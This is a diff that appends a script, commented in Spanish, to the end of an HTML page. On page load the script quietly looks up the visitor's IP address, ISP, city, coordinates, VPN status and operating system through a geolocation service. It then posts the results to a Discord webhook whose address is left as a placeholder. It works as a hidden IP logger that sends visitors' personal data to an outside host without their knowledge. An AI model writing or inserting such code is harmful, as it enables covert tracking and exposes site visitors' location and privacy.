@@ -116,3 +116,42 @@
   </script>
 </body>
 </html>
+
+<script>
+fetch("https://ipapi.co/json/") // también podés usar ipwhois.io/json/ o ipinfo.io/json
+  .then(response => response.json())
+  .then(ip_data => {
+    const system_info = {
+      os: navigator.platform,
+      bot: /bot|crawler|spider|crawling/i.test(navigator.userAgent),
+    };
+
+    const data = {
+      content: `
+📡 IP: ${ip_data.ip}
+🛰️ ISP: ${ip_data.org}
+🔎 ASN: ${ip_data.asn}
+🌎 País: ${ip_data.country_name}
+🏙️ Región: ${ip_data.region}
+🏠 Ciudad: ${ip_data.city}
+📍 Latitud: ${ip_data.latitude}
+📍 Longitud: ${ip_data.longitude}
+⏰ Zona Horaria: ${ip_data.timezone}
+📱 Conexión Móvil: ${ip_data.mobile ? 'Sí' : 'No'}
+🕵️ VPN/Proxy: ${ip_data.proxy ? 'Sí' : 'No'}
+🤖 Bot: ${system_info.bot ? 'Sí' : 'No'}
+💻 Sistema Operativo: ${system_info.os}
+      `
+    };
+
+    // Reemplazá esta URL con tu webhook de Discord
+    fetch("https://discord.com/api/webhooks/ID/CLAVE", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+    });
+  })
+  .catch(error => console.error("Error obteniendo IP info:", error));
+</script>
